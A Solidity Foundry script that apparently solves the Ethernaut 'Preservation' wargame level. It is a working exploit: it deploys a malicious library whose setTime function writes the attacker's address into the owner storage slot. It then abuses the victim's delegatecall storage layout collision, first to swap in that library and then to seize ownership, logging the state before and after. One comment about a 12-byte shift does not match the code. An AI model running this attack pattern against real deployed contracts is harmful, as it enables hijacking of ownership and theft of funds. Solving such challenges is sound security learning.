// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IPreservation {
    function timeZone1Library() external view returns (address);
    function timeZone2Library() external view returns (address);
    function owner() external view returns (address);
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
}

contract PreservationAttackMaliciousLibrary is Constants {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = ATTACKER_ADDRESS;
    }
}

contract PreservationAttacker is Constants, Script {
    function run() public {
        IPreservation victim = IPreservation(PRESERVATION_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }

    function attack(IPreservation victim) private {
        PreservationAttackMaliciousLibrary maliciousLibrary = new PreservationAttackMaliciousLibrary();

        console.log("Library1 PRE: ", victim.timeZone1Library());
        console.log("Library2 PRE: ", victim.timeZone2Library());
        console.log("Malicious library address: ", address(maliciousLibrary));
        console.log("Owner PRE: ", victim.owner());

        // shift to the left by 12 bytes (12 * 8 = 96 bits)
        uint256 maliciousContractValue = uint256(uint160(address(maliciousLibrary)));
        uint256 foo = 1;

        victim.setSecondTime(maliciousContractValue);
        victim.setFirstTime(foo);

        console.log("Library1 POST: ", victim.timeZone1Library());
        console.log("Library2 POST: ", victim.timeZone2Library());
        console.log("Owner POST: ", victim.owner());
    }
}